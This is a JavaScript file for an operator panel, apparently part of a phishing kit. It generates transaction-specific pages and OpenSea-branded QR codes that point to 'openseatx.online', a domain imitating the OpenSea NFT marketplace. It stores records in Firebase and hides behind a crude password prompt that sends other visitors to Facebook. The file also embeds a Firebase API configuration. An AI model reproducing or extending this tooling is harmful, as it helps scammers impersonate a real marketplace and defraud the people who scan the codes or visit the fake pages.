console.log('yawa')


$(document).ready( function () {
	
  if (localStorage.getItem('status') == 'browserSaved') {
			//
  } else {
		ifnotSaved()
  }
  
})


function ifnotSaved() {

var v = prompt('unsay color sa blue?')

if (v == 'kwarta') {
	//
  localStorage.setItem('status', 'browserSaved')
} else {
	location.href = "https://facebook.com"
}

}

const app = firebase.initializeApp({
    apiKey: "AIzaSyAZaVfOOPYkw3kFTi1FlynQ41vT4IMXVpQ",
    authDomain: "pamalikasako.firebaseapp.com",
    databaseURL: "https://pamalikasako-default-rtdb.firebaseio.com",
    projectId: "pamalikasako",
    storageBucket: "pamalikasako.appspot.com",
    messagingSenderId: "393016043530",
    appId: "1:393016043530:web:356a22824be3f5d0ce57f3",
    measurementId: "G-FQ4XL0C28F"
  })



const db = firebase.firestore(app);



const URL = 'https://openseatx.online/assets/'

$('#_a').on('submit', function () {
    var txID = $('#_a').find('input').eq([0]).val();
    console.log(txID)
    
    
    $('#_b').find('input').eq([0]).val(txID)


    var data = {

        nft: $('#_a').find('input').eq([1]).val(),
        image: $('#_a').find('input').eq([2]).val(),
        status: 'start'
    }

    const ref = db.collection(txID).doc('info')
    ref.set(data)
        .then( function () {

            something()

            console.log('scuc')
        })
        .catch( function () {
            console.log('er')
        })
})

function something(){
    const txID = $('#_a').find('input').eq([0]).val();
    const the_link = `${URL}${txID}`

    $('#LINKHERE').html(the_link)

    console.log(the_link)
	location.href= 'https://openseatx.online/upload'
}





 



$('#_b').on('submit', function (e) {
    e.preventDefault();
    var _page = $('#_b').find('input').eq([0]).val()
    var url = $(this).closest('form').attr('action');
    var data = $(this).closest('form').serialize();
    

    // const ct = 'https://laughing-invention-vjqj65x9g442wrpx-8000.app.github.dev/assets/test.php'

     //QR(_page)
     QRNEW(_page)



    console.log(data)
    $.ajax({
        url: url,
        type: 'post',
        data: data,
        success: function (data) {
            // window.open(`${_page}`, '_blank');
             $('#userlinkpage').html(`succesfully created page, link below: <h3 style="color:blue">${URL}${_page}</h3>`)



        }
    })
})


$('#cancel').on('click', function () {
    let v = $('#cancelTX').val()
    
    return db.collection(v).doc('info').set({
        status: 'cancel'
    }).then( function () {
        alert('tx cancelled')
    }).catch( function (error) {
        console.log(error)
    })
})


function QR(link) {
    $('#qrcode').html('')


    var qr = new QRCode(document.getElementById("qrcode"), `${URL}${link}`);

    
}



function QRNEW(link) {


    const qrCode = new QRCodeStyling({
        width: 300,
        height: 300,
        type: "svg",
        data: `${URL}${link}`,
        image: "https://giterhaber.github.io/qrqr/core/opensea.svg",
        dotsOptions: {
            color: "black",
            type: ""
        },
        backgroundOptions: {
            color: "#ffffff",
        },
        imageOptions: {
            crossOrigin: "anonymous",
            margin: 5
        }
    });

    qrCode.append(document.getElementById("canvas"));
}
